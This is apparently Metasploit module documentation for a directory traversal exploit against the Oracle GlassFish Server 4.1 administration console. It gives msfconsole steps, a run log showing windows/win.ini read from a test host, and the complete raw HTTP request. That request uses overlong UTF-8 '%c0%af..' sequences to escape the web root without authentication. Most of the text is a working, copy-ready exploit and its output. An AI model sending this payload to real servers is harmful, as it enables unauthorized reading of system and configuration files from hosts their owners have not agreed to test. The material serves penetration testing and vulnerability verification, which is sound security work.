## Vulnerable Application

This module exploits an unauthenticated directory traversal vulnerability which exists in administration console of,
Oracle GlassFish Server 4.1, which is listening by default on port 4848/TCP.

Related links :

* https://www.exploit-db.com/exploits/39441/
* https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904
* http://download.oracle.com/glassfish/4.1/release/glassfish-4.1.zip - Download Oracle Glass Fish 4.1

## Verification

  1. Start msfconsole
  2. Do: ```use auxiliary/scanner/http/glassfish_traversal```
  3. Do: ```set RHOSTS [IP]```
  4. Do: ```run```
  
## Scenarios

```
msf > use auxiliary/scanner/http/glassfish_traversal 
msf auxiliary(scanner/http/glassfish_traversal) > set RHOSTS 192.168.1.105
RHOSTS => 192.168.1.105
msf auxiliary(scanner/http/glassfish_traversal) > set verbose true
verbose => true
msf auxiliary(scanner/http/glassfish_traversal) > run

[+] 192.168.1.105:4848 - ; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
[MCI Extensions.BAK]
3g2=MPEGVideo
3gp=MPEGVideo
3gp2=MPEGVideo
3gpp=MPEGVideo
aac=MPEGVideo
adt=MPEGVideo
adts=MPEGVideo
m2t=MPEGVideo
m2ts=MPEGVideo
m2v=MPEGVideo
m4a=MPEGVideo
m4v=MPEGVideo
mod=MPEGVideo
mov=MPEGVideo
mp4=MPEGVideo
mp4v=MPEGVideo
mts=MPEGVideo
ts=MPEGVideo
tts=MPEGVideo

[+] File saved in: /home/input0/.msf4/loot/20180804132151_default_192.168.1.105_oracle.traversal_244542.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/glassfish_traversal) >
```

## HTTP Request

```
GET /theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini HTTP/1.1
Host: 192.168.1.105:4848
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=3c54ae091ab200dc3ce8ecfff7c1
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sat, 04 Aug 2018 05:53:42 GMT
```

## HTTP Response

```
HTTP/1.1 200 OK
Content-Length: 403
Content-Type: text/plain
Expires: Mon, 30 Jul 2018 11:16:55 GMT
Last-Modified: Tue, 14 Jul 2009 05:09:22 GMT
Server: Microsoft-HTTPAPI/2.0
Date: Sun, 29 Jul 2018 06:46:55 GMT
Connection: close

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
[MCI Extensions.BAK]
3g2=MPEGVideo
3gp=MPEGVideo
3gp2=MPEGVideo
3gpp=MPEGVideo
aac=MPEGVideo
adt=MPEGVideo
adts=MPEGVideo
m2t=MPEGVideo
m2ts=MPEGVideo
m2v=MPEGVideo
m4a=MPEGVideo
m4v=MPEGVideo
mod=MPEGVideo
mov=MPEGVideo
mp4=MPEGVideo
mp4v=MPEGVideo
mts=MPEGVideo
ts=MPEGVideo
tts=MPEGVideo
```
